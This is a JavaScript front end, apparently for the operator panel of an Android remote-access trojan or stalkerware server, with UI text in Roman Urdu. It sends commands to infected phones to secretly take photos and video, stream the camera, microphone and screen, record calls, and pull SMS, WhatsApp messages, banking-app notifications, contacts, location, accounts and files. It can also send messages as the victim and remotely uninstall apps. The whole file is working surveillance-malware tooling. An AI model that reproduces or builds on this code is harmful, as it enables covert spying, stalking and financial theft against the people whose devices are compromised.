const SERVER_URL = window.location.origin;
let currentTab = 'devices';
let allData = {};
let socket;
let autoRefreshTimer = null;

// ============ LOGIN ============
function login() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  fetch(SERVER_URL + '/api/admin/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  })
  .then(r => r.json())
  .then(data => {
    if (data.success) {
      localStorage.setItem('csk4_token', data.token);
      showDashboard();
    } else {
      document.getElementById('loginError').textContent = '❌ Galat credentials';
    }
  })
  .catch(() => document.getElementById('loginError').textContent = '❌ Server error');
}

function logout() {
  localStorage.removeItem('csk4_token');
  location.reload();
}

function showDashboard() {
  document.getElementById('loginScreen').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  loadData();
  autoRefreshTimer = setInterval(loadData, 30000);

  socket = io();
  socket.emit('register-admin');
  [
    'device-update','new-location','new-file','contacts-update','nearby-update',
    'messages-update','calllogs-update','apps-update','info-update',
    'bluetooth-update','new-notification','whatsapp-update','activity-update',
    'callrecording-update','siminfo-update','accounts-update','emails-update'
  ].forEach(ev => socket.on(ev, () => refreshStatsOnly()));
}

// ============ LOAD DATA ============
function loadData() {
  const savedDevice = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev') || '';
  const savedCmd = document.getElementById('cmdType')?.value || localStorage.getItem('csk4_cmd') || '';

  fetch(SERVER_URL + '/api/admin/data')
    .then(r => r.json())
    .then(data => {
      allData = data;
      renderStats(data.stats || {});
      renderTab(currentTab);
      setTimeout(() => {
        const devSel = document.getElementById('cmdDevice');
        const cmdSel = document.getElementById('cmdType');
        if (devSel && savedDevice) devSel.value = savedDevice;
        if (cmdSel && savedCmd) cmdSel.value = savedCmd;
      }, 50);
    })
    .catch(err => console.error(err));
}

function refreshStatsOnly() {
  fetch(SERVER_URL + '/api/admin/data')
    .then(r => r.json())
    .then(data => {
      allData = data;
      renderStats(data.stats || {});
      if (['notifications','whatsapp','activities','siminfo','accounts','emails'].includes(currentTab)) {
        renderTab(currentTab);
      }
    })
    .catch(err => console.error(err));
}

function renderStats(s) {
  document.getElementById('statsGrid').innerHTML = `
    <div class="stat-card"><div class="stat-value">${s.totalDevices||0}</div><div class="stat-label">Devices</div></div>
    <div class="stat-card"><div class="stat-value">${s.onlineDevices||0}</div><div class="stat-label">Online</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalSims||0}</div><div class="stat-label">SIMs</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalAccounts||0}</div><div class="stat-label">Accounts</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalEmails||0}</div><div class="stat-label">Emails</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalNotifications||0}</div><div class="stat-label">Notifs</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalWhatsapp||0}</div><div class="stat-label">WhatsApp</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalMessages||0}</div><div class="stat-label">SMS</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalContacts||0}</div><div class="stat-label">Contacts</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalLocations||0}</div><div class="stat-label">Locations</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalPhotos||0}</div><div class="stat-label">Photos</div></div>
    <div class="stat-card"><div class="stat-value">${s.totalCallRecordings||0}</div><div class="stat-label">Call Rec</div></div>
  `;
}

// ============ TABS ============
function showTab(tab, event) {
  currentTab = tab;
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  if (event) event.target.classList.add('active');
  renderTab(tab);
}

function renderTab(tab) {
  const el = document.getElementById('tabContent');
  const r = {
    devices: renderDevices, live: renderLive, screen: renderScreen,
    notifications: renderNotifications, whatsapp: renderWhatsapp,
    messages: renderMessages, calllogs: renderCallLogs, callrec: renderCallRecordings,
    locations: renderLocations, contacts: renderContacts, photos: renderPhotos,
    videos: renderVideos, screenshots: renderScreenshots, audio: renderAudio,
    files: renderFiles, apps: renderApps, bluetooth: renderBluetooth,
    activities: renderActivities, send: renderSend, info: renderInfo,
    commands: renderCommands,
    siminfo: renderSimInfo,
    accounts: renderAccounts,
    emails: renderEmails
  };
  el.innerHTML = (r[tab] || (() => '<div class="loading">Soon</div>'))();
}

// ============ DEVICES ============
function renderDevices() {
  const list = Object.values(allData.devices || {});
  if (list.length === 0) return '<div class="loading">Koi device registered nahi</div>';
  const savedDevice = localStorage.getItem('csk4_dev') || '';
  const savedCmd = localStorage.getItem('csk4_cmd') || 'get_location';

  let html = `
    <div class="command-bar">
      <select id="cmdDevice" onchange="localStorage.setItem('csk4_dev', this.value)">
        <option value="">-- Device --</option>
        ${list.map(d => `<option value="${d.deviceId}" ${d.deviceId===savedDevice?'selected':''}>${d.deviceName}</option>`).join('')}
      </select>
      <select id="cmdType" onchange="localStorage.setItem('csk4_cmd', this.value)">
        <optgroup label="📸 Capture">
          <option value="take_photo_back" ${savedCmd==='take_photo_back'?'selected':''}>📷 Photo (Back)</option>
          <option value="take_photo_front" ${savedCmd==='take_photo_front'?'selected':''}>🤳 Photo (Front)</option>
          <option value="record_video_back" ${savedCmd==='record_video_back'?'selected':''}>🎥 Video (Back)</option>
          <option value="record_video_front" ${savedCmd==='record_video_front'?'selected':''}>🎥 Video (Front)</option>
          <option value="record_audio" ${savedCmd==='record_audio'?'selected':''}>🎤 Audio 10s</option>
          <option value="screenshot" ${savedCmd==='screenshot'?'selected':''}>📸 Screenshot</option>
        </optgroup>
        <optgroup label="📊 Data">
          <option value="get_location" ${savedCmd==='get_location'?'selected':''}>📍 Location</option>
          <option value="get_contacts" ${savedCmd==='get_contacts'?'selected':''}>👥 Contacts</option>
          <option value="get_messages" ${savedCmd==='get_messages'?'selected':''}>💬 SMS</option>
          <option value="get_calllogs" ${savedCmd==='get_calllogs'?'selected':''}>📞 Call Logs</option>
          <option value="get_files" ${savedCmd==='get_files'?'selected':''}>📁 Files</option>
          <option value="get_apps" ${savedCmd==='get_apps'?'selected':''}>📲 Apps</option>
          <option value="get_bluetooth" ${savedCmd==='get_bluetooth'?'selected':''}>📶 Bluetooth</option>
          <option value="get_info" ${savedCmd==='get_info'?'selected':''}>ℹ️ Info</option>
        </optgroup>
        <optgroup label="🆕 SIM & Accounts">
          <option value="get_sim_info" ${savedCmd==='get_sim_info'?'selected':''}>📱 SIM Info</option>
          <option value="get_accounts" ${savedCmd==='get_accounts'?'selected':''}>👤 Accounts</option>
          <option value="get_email_accounts" ${savedCmd==='get_email_accounts'?'selected':''}>📧 Emails</option>
        </optgroup>
        <optgroup label="🎮 Control">
          <option value="vibrate" ${savedCmd==='vibrate'?'selected':''}>📳 Vibrate</option>
          <option value="play_sound" ${savedCmd==='play_sound'?'selected':''}>🔊 Play Sound</option>
          <option value="flashlight_on" ${savedCmd==='flashlight_on'?'selected':''}>🔦 Flash ON</option>
          <option value="flashlight_off" ${savedCmd==='flashlight_off'?'selected':''}>💡 Flash OFF</option>
          <option value="lock_screen" ${savedCmd==='lock_screen'?'selected':''}>🔒 Lock</option>
        </optgroup>
        <optgroup label="🔴 Live">
          <option value="start_webrtc" ${savedCmd==='start_webrtc'?'selected':''}>🔴 Camera Stream</option>
          <option value="start_audio_stream" ${savedCmd==='start_audio_stream'?'selected':''}>🎤 Audio Stream</option>
          <option value="start_screen_mirror" ${savedCmd==='start_screen_mirror'?'selected':''}>🖥️ Screen Mirror</option>
          <option value="stop_webrtc" ${savedCmd==='stop_webrtc'?'selected':''}>⏹️ Stop Stream</option>
          <option value="switch_camera" ${savedCmd==='switch_camera'?'selected':''}>🔄 Switch Camera</option>
        </optgroup>
        <optgroup label="📞 Call Recording">
          <option value="start_call_recording" ${savedCmd==='start_call_recording'?'selected':''}>🎙️ Start Call Rec</option>
          <option value="stop_call_recording" ${savedCmd==='stop_call_recording'?'selected':''}>⏹️ Stop Call Rec</option>
        </optgroup>
        <optgroup label="📱 App Control">
          <option value="open_app" ${savedCmd==='open_app'?'selected':''}>📱 Open App</option>
          <option value="uninstall_app" ${savedCmd==='uninstall_app'?'selected':''}>🗑️ Uninstall App</option>
          <option value="force_stop_app" ${savedCmd==='force_stop_app'?'selected':''}>⏹️ Force Stop</option>
        </optgroup>
        <optgroup label="⚙️ Settings">
          <option value="set_brightness" ${savedCmd==='set_brightness'?'selected':''}>🔆 Brightness</option>
          <option value="set_volume" ${savedCmd==='set_volume'?'selected':''}>🔊 Volume</option>
          <option value="set_ring_mode" ${savedCmd==='set_ring_mode'?'selected':''}>🔔 Ring Mode</option>
        </optgroup>
      </select>
      <button onclick="sendCommand()">🚀 Send</button>
      <button onclick="clearCommands()" style="background:#7f1d1d">🗑️</button>
    </div>
  `;

  list.forEach(d => {
    const online = d.online ? 'online' : 'offline';
    html += `
      <div class="device-card">
        <div>
          <div class="device-name">📱 ${d.deviceName}</div>
          <div class="device-id">🆔 ${d.deviceId}</div>
          <div class="device-id">🔋 ${d.battery||0}% | ⏰ ${new Date(d.lastSeen).toLocaleString()}</div>
        </div>
        <div>
          <span class="badge ${online}">${online}</span>
          <button class="btn-action" onclick="quickLive('${d.deviceId}')" style="background:#dc2626">🔴 Live</button>
          <button class="btn-action" onclick="quickScreen('${d.deviceId}')" style="background:#0891b2">🖥️ Screen</button>
          <button class="btn-action btn-danger" onclick="deleteDevice('${d.deviceId}')">🗑️</button>
        </div>
      </div>
    `;
  });
  return html;
}

function quickLive(deviceId) {
  localStorage.setItem('csk4_dev', deviceId);
  currentTab = 'live';
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  const t = document.querySelector('.tab[data-tab="live"]');
  if (t) t.classList.add('active');
  renderTab('live');
  setTimeout(() => {
    const sel = document.getElementById('liveDevice');
    if (sel) sel.value = deviceId;
    startLiveStream(deviceId, 'camera');
  }, 200);
}

function quickScreen(deviceId) {
  localStorage.setItem('csk4_dev', deviceId);
  currentTab = 'screen';
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  const t = document.querySelector('.tab[data-tab="screen"]');
  if (t) t.classList.add('active');
  renderTab('screen');
  setTimeout(() => {
    const sel = document.getElementById('screenDevice');
    if (sel) sel.value = deviceId;
    startScreenMirror(deviceId);
  }, 200);
}

function renderLive() {
  const list = Object.values(allData.devices || {});
  return `
    <div class="live-container">
      <div class="live-header">
        <select id="liveDevice">
          <option value="">-- Device Select --</option>
          ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
        </select>
        <button onclick="startLiveStream(document.getElementById('liveDevice').value, 'camera')" style="background:#dc2626">🔴 Camera Live</button>
        <button onclick="startLiveStream(document.getElementById('liveDevice').value, 'audio')" style="background:#7c3aed">🎤 Audio Live</button>
        <button onclick="switchCamera()" style="background:#0891b2">🔄 Switch</button>
        <button onclick="stopLiveStream()" style="background:#374151">⏹️ Stop</button>
      </div>
      <div class="live-video-wrap">
        <video id="liveVideo" autoplay playsinline controls muted></video>
        <div id="liveStatus" class="live-status">Not streaming</div>
      </div>
      <audio id="liveAudio" autoplay controls style="width:100%;margin-top:12px"></audio>
    </div>
  `;
}

function renderScreen() {
  const list = Object.values(allData.devices || {});
  return `
    <div class="screen-container">
      <div class="live-header">
        <select id="screenDevice">
          <option value="">-- Device Select --</option>
          ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
        </select>
        <button onclick="startScreenMirror(document.getElementById('screenDevice').value)" style="background:#0891b2">🖥️ Start Mirror</button>
        <button onclick="stopScreenMirror()" style="background:#374151">⏹️ Stop</button>
      </div>
      <div class="screen-wrap">
        <video id="screenVideo" autoplay playsinline controls muted></video>
        <div id="screenStatus" class="live-status">Not streaming</div>
      </div>
      <div style="margin-top:16px;background:#0a0e27;padding:16px;border-radius:8px;border:1px solid #2a3255">
        <h3 style="color:#4f8cff;margin-bottom:12px">👆 Remote Touch Control</h3>
        <div style="display:flex;gap:8px;flex-wrap:wrap">
          <button onclick="sendTouch('tap', 0.5, 0.5)" class="btn-action">Tap Center</button>
          <button onclick="sendTouch('back', 0, 0)" class="btn-action">← Back</button>
          <button onclick="sendTouch('home', 0, 0)" class="btn-action">🏠 Home</button>
          <button onclick="sendTouch('recent', 0, 0)" class="btn-action">📋 Recent</button>
        </div>
      </div>
    </div>
  `;
}

// ============ NOTIFICATIONS ============
function renderNotifications() {
  const list = (allData.notifications || []).slice().reverse().slice(0, 200);
  if (!list.length) return '<div class="loading">Koi notification nahi</div>';
  return list.map(n => {
    let cls = '';
    const pkg = (n.package || '').toLowerCase();
    if (pkg.includes('whatsapp')) cls = 'whatsapp';
    else if (pkg.includes('messaging') || pkg.includes('mms')) cls = 'sms';
    else if (pkg.includes('gmail')) cls = 'gmail';
    else if (pkg.includes('instagram')) cls = 'instagram';
    else if (pkg.includes('bank') || pkg.includes('hbl') || pkg.includes('ubl')) cls = 'bank';
    return `
      <div class="notification-item ${cls}">
        <span class="notification-app">${esc(n.package || 'Unknown')}</span>
        <div class="notification-title">${esc(n.title || 'No title')}</div>
        <div class="notification-text">${esc(n.text || 'No text')}</div>
        <div class="notification-time">${new Date(n.time).toLocaleString()}</div>
      </div>
    `;
  }).join('');
}

function renderWhatsapp() {
  const list = (allData.whatsapp || []).slice().reverse().slice(0, 200);
  if (!list.length) return '<div class="loading">Koi WhatsApp message nahi</div>';
  return list.map(w => `
    <div class="notification-item whatsapp">
      <span class="notification-app">WhatsApp</span>
      <div class="notification-title">💬 ${esc(w.from || 'Unknown')}</div>
      <div class="notification-text">${esc(w.message || '')}</div>
      <div class="notification-time">${new Date(w.time).toLocaleString()}</div>
    </div>
  `).join('');
}

function renderMessages() {
  const list = (allData.messages || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi SMS nahi</div>';
  return list.map(m => {
    const typeColor = m.type === 'sent' ? '#4ade80' : '#4f8cff';
    const typeIcon = m.type === 'sent' ? '📤' : '📥';
    return `
    <div class="item-card" style="flex-direction:column;align-items:flex-start">
      <div style="display:flex;justify-content:space-between;width:100%">
        <div class="device-name" style="color:${typeColor}">${typeIcon} ${esc(m.from)}</div>
        ${m.read === false ? '<span class="badge unread">UNREAD</span>' : ''}
      </div>
      <div style="color:#8b9ab5;margin:6px 0">${esc(m.body)}</div>
      <div class="device-id">${new Date(parseInt(m.time)||m.time).toLocaleString()}</div>
    </div>
  `}).join('');
}

function renderCallLogs() {
  const list = (allData.callLogs || []).slice(0, 500);
  if (!list.length) return '<div class="loading">Koi call nahi</div>';
  const types = {1:'📥',2:'📤',3:'❌',4:'📮',5:'🚫',6:'⏱️'};
  return list.map(c => `
    <div class="item-card">
      <div>
        <div class="device-name">${types[c.type]||'📞'} ${esc(c.name || 'Unknown')}</div>
        <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(c.number)}</div>
        <div class="device-id">⏱️ ${c.duration}s | ${new Date(parseInt(c.time)).toLocaleString()}</div>
      </div>
      <a href="tel:${c.number}" class="btn-action">📞</a>
    </div>
  `).join('');
}

function renderCallRecordings() {
  const list = (allData.callRecordings || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi call recording nahi</div>';
  return list.map(r => `
    <div class="item-card" style="flex-direction:column;align-items:flex-start">
      <div class="device-name">🎙️ ${esc(r.number)}</div>
      <div class="device-id">${r.type || ''} | ⏱️ ${r.duration}s | ${new Date(r.time).toLocaleString()}</div>
      <audio controls style="width:100%;margin-top:8px"><source src="${r.url}"></audio>
    </div>
  `).join('');
}

function renderLocations() {
  const list = (allData.locations || []).slice().reverse().slice(0, 200);
  if (!list.length) return '<div class="loading">Koi location nahi</div>';
  return list.map(l => `
    <div class="item-card">
      <div>
        <div class="device-id">${l.deviceId}</div>
        <div style="color:#4f8cff;font-weight:600;margin:4px 0">📍 ${l.lat.toFixed(6)}, ${l.lng.toFixed(6)}</div>
        <div class="device-id">🎯 ${l.accuracy?Math.round(l.accuracy)+'m':'N/A'} | ⏰ ${new Date(l.time).toLocaleString()}</div>
      </div>
      <a href="https://maps.google.com/?q=${l.lat},${l.lng}" target="_blank" class="btn-action">🗺️</a>
    </div>
  `).join('');
}

function renderContacts() {
  const list = allData.contacts || [];
  if (!list.length) return '<div class="loading">Koi contact nahi</div>';
  return list.map(c => `
    <div class="item-card">
      <div>
        <div class="device-name">👤 ${esc(c.name || 'Unknown')}</div>
        <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(c.phone || 'No number')}</div>
        ${c.type ? `<div class="device-id">📱 ${c.type}</div>` : ''}
      </div>
      <div>
        <a href="tel:${c.phone}" class="btn-action">📞</a>
        <a href="sms:${c.phone}" class="btn-action">💬</a>
      </div>
    </div>
  `).join('');
}

// ============ 🆕 SIM INFO ============
function renderSimInfo() {
  const simData = allData.simInfo || {};
  const deviceIds = Object.keys(simData);
  if (!deviceIds.length) return '<div class="loading">SIM info command bhejein</div>';
  let html = '';
  deviceIds.forEach(deviceId => {
    const data = simData[deviceId];
    if (!data.sims || !data.sims.length) return;
    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">📱 ${esc(deviceId)}</h3>`;
    data.sims.forEach(sim => {
      html += `
        <div class="device-card" style="flex-direction:column;align-items:flex-start">
          <div class="device-name">📶 SIM ${sim.slot}</div>
          <div class="device-id" style="font-size:14px;color:#4f8cff;font-weight:600">📞 ${esc(sim.number || 'N/A')}</div>
          <div class="device-id">📡 Operator: ${esc(sim.operator || 'N/A')}</div>
          <div class="device-id">🌍 Country: ${esc(sim.country || 'N/A')}</div>
          <div class="device-id">📶 Network: ${esc(sim.networkType || 'N/A')}</div>
          <div class="device-id">🎯 State: ${esc(sim.state || 'N/A')}</div>
          ${sim.serial ? `<div class="device-id">🔢 Serial: ${esc(sim.serial)}</div>` : ''}
        </div>
      `;
    });
  });
  return html;
}

// ============ 🆕 ACCOUNTS ============
function renderAccounts() {
  const accData = allData.accounts || {};
  const deviceIds = Object.keys(accData);
  if (!deviceIds.length) return '<div class="loading">Accounts command bhejein</div>';
  let html = '';
  deviceIds.forEach(deviceId => {
    const data = accData[deviceId];
    if (!data.accounts || !data.accounts.length) return;
    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">👤 ${esc(deviceId)} (${data.total})</h3>`;
    data.accounts.forEach(acc => {
      let icon = '📧';
      if (acc.type.includes('whatsapp')) icon = '💬';
      else if (acc.type.includes('facebook')) icon = '👥';
      else if (acc.type.includes('instagram')) icon = '📸';
      else if (acc.type.includes('twitter')) icon = '🐦';
      else if (acc.type.includes('linkedin')) icon = '💼';
      else if (acc.type.includes('google')) icon = '🔍';
      html += `
        <div class="item-card">
          <div>
            <div class="device-name">${icon} ${esc(acc.name)}</div>
            <div class="device-id">${esc(acc.type)}</div>
          </div>
        </div>
      `;
    });
  });
  return html;
}

// ============ 🆕 EMAILS ============
function renderEmails() {
  const emailData = allData.emails || {};
  const deviceIds = Object.keys(emailData);
  if (!deviceIds.length) return '<div class="loading">Email command bhejein</div>';
  let html = '';
  deviceIds.forEach(deviceId => {
    const data = emailData[deviceId];
    if (!data.emails || !data.emails.length) return;
    html += `<h3 style="color:#4f8cff;margin:16px 0 12px">📧 ${esc(deviceId)} (${data.total})</h3>`;
    data.emails.forEach(email => {
      html += `
        <div class="item-card">
          <div>
            <div class="device-name">📧 ${esc(email)}</div>
            <div class="device-id">Google Account</div>
          </div>
        </div>
      `;
    });
  });
  return html;
}

function renderPhotos() {
  const list = (allData.photos || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi photo nahi</div>';
  return '<div class="photos-grid">' + list.map(p => `
    <a href="${p.url}" target="_blank"><img src="${p.url}"></a>
  `).join('') + '</div>';
}

function renderVideos() {
  const list = (allData.videos || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi video nahi</div>';
  return list.map(v => `
    <div class="item-card" style="flex-direction:column;align-items:flex-start">
      <div class="device-name">🎥 ${v.originalName}</div>
      <div class="device-id">${(v.size/1024/1024).toFixed(2)} MB</div>
      <video controls style="width:100%;max-width:400px;margin-top:8px"><source src="${v.url}"></video>
    </div>
  `).join('');
}

function renderScreenshots() {
  const list = (allData.screenshots || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi screenshot nahi</div>';
  return '<div class="photos-grid">' + list.map(p => `
    <a href="${p.url}" target="_blank"><img src="${p.url}"></a>
  `).join('') + '</div>';
}

function renderAudio() {
  const list = (allData.audio || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi audio nahi</div>';
  return list.map(a => `
    <div class="item-card" style="flex-direction:column;align-items:flex-start">
      <div class="device-name">🎤 ${a.originalName}</div>
      <div class="device-id">${new Date(a.time).toLocaleString()}</div>
      <audio controls style="width:100%;margin-top:8px"><source src="${a.url}"></audio>
    </div>
  `).join('');
}

function renderFiles() {
  const list = (allData.files || []).slice().reverse();
  if (!list.length) return '<div class="loading">Koi file nahi</div>';
  return list.map(f => `
    <div class="item-card">
      <div>
        <div class="device-name">📄 ${f.originalName}</div>
        <div class="device-id">${(f.size/1024).toFixed(1)} KB | ${new Date(f.time).toLocaleString()}</div>
      </div>
      <a href="${f.url}" target="_blank" class="btn-action">⬇️</a>
    </div>
  `).join('');
}

function renderApps() {
  const list = allData.apps || [];
  if (!list.length) return '<div class="loading">Apps command bhejein</div>';
  return list.map(a => `
    <div class="item-card">
      <div>
        <div class="device-name">📲 ${esc(a.name)}</div>
        <div class="device-id">${a.package}</div>
      </div>
      <button class="btn-action" onclick="openApp('${a.package}')">▶️ Open</button>
      <button class="btn-action btn-danger" onclick="uninstallApp('${a.package}')">🗑️ Uninstall</button>
    </div>
  `).join('');
}

function renderBluetooth() {
  const list = allData.bluetooth || [];
  if (!list.length) return '<div class="loading">Bluetooth command bhejein</div>';
  return list.map(d => `
    <div class="item-card">
      <div>
        <div class="device-name">📶 ${esc(d.name||'Unknown')}</div>
        <div class="device-id">${d.address} | ${d.type||''} | RSSI: ${d.rssi||'N/A'}</div>
      </div>
    </div>
  `).join('');
}

function renderActivities() {
  const list = (allData.activities || []).slice().reverse().slice(0, 300);
  if (!list.length) return '<div class="loading">Koi activity nahi</div>';
  return list.map(a => {
    let icon = '📊';
    if (a.type === 'sms') icon = '📩';
    else if (a.type === 'call') icon = '📞';
    else if (a.type === 'app_open') icon = '📱';
    else if (a.type === 'screen_on') icon = '💡';
    else if (a.type === 'screen_off') icon = '🌙';
    else if (a.type === 'battery') icon = '🔋';
    else if (a.type === 'contact') icon = '👤';
    else if (a.type === 'photo') icon = '📷';
    return `
      <div class="activity-item">
        <div class="activity-icon">${icon}</div>
        <div class="activity-content">
          <div class="activity-type">${esc(a.type || 'activity')}</div>
          <div class="activity-data">${esc(JSON.stringify(a.data || {}))}</div>
        </div>
        <div class="activity-time">${new Date(a.time).toLocaleTimeString()}</div>
      </div>
    `;
  }).join('');
}

function renderSend() {
  const list = Object.values(allData.devices || {});
  if (list.length === 0) return '<div class="loading">Pehle device register karein</div>';
  return `
    <div class="send-form">
      <h3>📤 Send Message to Device</h3>
      <select id="sendDevice">
        <option value="">-- Device Select --</option>
        ${list.map(d => `<option value="${d.deviceId}">${d.deviceName}</option>`).join('')}
      </select>
      <select id="sendType">
        <option value="show_notification">🔔 Notification</option>
        <option value="send_sms">📩 SMS</option>
        <option value="send_whatsapp">💬 WhatsApp</option>
      </select>
      <input type="text" id="sendTo" placeholder="To (phone number)">
      <input type="text" id="sendTitle" placeholder="Title">
      <textarea id="sendMessage" placeholder="Message text"></textarea>
      <button onclick="sendCustomMessage()">🚀 Send</button>
    </div>
  `;
}

function renderInfo() {
  const info = allData.deviceInfo || {};
  const keys = Object.keys(info);
  if (!keys.length) return '<div class="loading">Info command bhejein</div>';
  return keys.map(k => {
    const i = info[k];
    return `
      <div class="device-card"><div style="width:100%">
        <div class="device-name">📱 ${i.model||k}</div>
        <div class="device-id">Brand: ${i.brand} | Android: ${i.android} (SDK ${i.sdk})</div>
        <div class="device-id">CPU: ${i.cpu}</div>
        <div class="device-id">RAM: ${i.availableRAM}/${i.totalRAM} MB</div>
        <div class="device-id">Storage: ${i.availableStorage}/${i.totalStorage} MB</div>
      </div></div>
    `;
  }).join('');
}

function renderCommands() {
  const list = (allData.commands || []).slice().reverse().slice(0, 200);
  if (!list.length) return '<div class="loading">Koi command nahi</div>';
  return list.map(c => `
    <div class="item-card">
      <div>
        <div class="device-name">🎮 ${c.command}</div>
        <div class="device-id">${c.deviceId}</div>
        <div class="device-id">${new Date(c.time).toLocaleString()}</div>
        ${c.result ? `<div class="device-id">↳ ${c.result}</div>` : ''}
      </div>
      <span class="badge ${c.status==='done'?'online':'offline'}">${c.status}</span>
    </div>
  `).join('');
}

// ============ ACTIONS ============
function sendCommand() {
  const deviceId = document.getElementById('cmdDevice').value;
  const command = document.getElementById('cmdType').value;
  if (!deviceId) return alert('Device select karein');
  localStorage.setItem('csk4_dev', deviceId);
  localStorage.setItem('csk4_cmd', command);

  let params = {};
  if (['set_brightness', 'set_volume'].includes(command)) {
    const val = prompt('Value (0-100):', '50');
    if (!val) return;
    params.value = parseInt(val);
  } else if (command === 'set_ring_mode') {
    const val = prompt('Mode (silent/vibrate/normal):', 'silent');
    if (!val) return;
    params.mode = val;
  } else if (['open_app', 'uninstall_app', 'force_stop_app'].includes(command)) {
    const pkg = prompt('Package name (e.g. com.whatsapp):');
    if (!pkg) return;
    params.package = pkg;
  }

  fetch(SERVER_URL + '/api/admin/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command, params })
  })
  .then(r => r.json())
  .then(d => {
    if (d.success) toast('✅ ' + command + ' bheja');
    else toast('❌ ' + (d.error||'Fail'));
  })
  .catch(() => toast('❌ Fail'));
}

function sendCustomMessage() {
  const deviceId = document.getElementById('sendDevice').value;
  const type = document.getElementById('sendType').value;
  const to = document.getElementById('sendTo').value;
  const title = document.getElementById('sendTitle').value;
  const message = document.getElementById('sendMessage').value;
  if (!deviceId) return alert('Device select karein');
  if (!message) return alert('Message likhein');
  let params = { message, title, to, number: to };
  fetch(SERVER_URL + '/api/admin/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command: type, params })
  })
  .then(r => r.json())
  .then(d => { if (d.success) { toast('✅ Bhej diya'); document.getElementById('sendMessage').value = ''; } })
  .catch(() => toast('❌ Fail'));
}

function sendTouch(action, x, y) {
  const deviceId = document.getElementById('screenDevice').value;
  if (!deviceId) return alert('Device select karein');
  fetch(SERVER_URL + '/api/admin/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command: 'touch_' + action, params: { x, y } })
  }).then(() => toast('👆 Touch bheja'));
}

function openApp(pkg) {
  const deviceId = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev');
  if (!deviceId) return alert('Device select karein');
  fetch(SERVER_URL + '/api/admin/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command: 'open_app', params: { package: pkg } })
  }).then(() => toast('📱 Open: ' + pkg));
}

function uninstallApp(pkg) {
  if (!confirm('Uninstall ' + pkg + '?')) return;
  const deviceId = document.getElementById('cmdDevice')?.value || localStorage.getItem('csk4_dev');
  if (!deviceId) return alert('Device select karein');
  fetch(SERVER_URL + '/api/admin/command', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ deviceId, command: 'uninstall_app', params: { package: pkg } })
  }).then(() => toast('🗑️ Uninstall: ' + pkg));
}

function deleteDevice(id) {
  if (!confirm('Remove?')) return;
  fetch(SERVER_URL + '/api/admin/device/' + id, { method: 'DELETE' }).then(() => loadData());
}

function clearCommands() {
  const id = document.getElementById('cmdDevice').value;
  if (!id) return alert('Device select karein');
  fetch(SERVER_URL + '/api/admin/clear-commands/' + id, { method: 'DELETE' }).then(() => loadData());
}

function esc(s) {
  if (s === null || s === undefined) return '';
  const d = document.createElement('div');
  d.textContent = String(s);
  return d.innerHTML;
}

function toast(m) {
  const t = document.createElement('div');
  t.style.cssText = 'position:fixed;top:20px;right:20px;background:#4f8cff;color:#fff;padding:12px 20px;border-radius:8px;z-index:9999;box-shadow:0 4px 12px rgba(0,0,0,0.3);font-size:14px';
  t.textContent = m;
  document.body.appendChild(t);
  setTimeout(() => t.remove(), 3000);
}

document.addEventListener('DOMContentLoaded', () => {
  if (localStorage.getItem('csk4_token')) showDashboard();
  const pass = document.getElementById('password');
  if (pass) pass.addEventListener('keypress', e => { if (e.key === 'Enter') login(); });
});
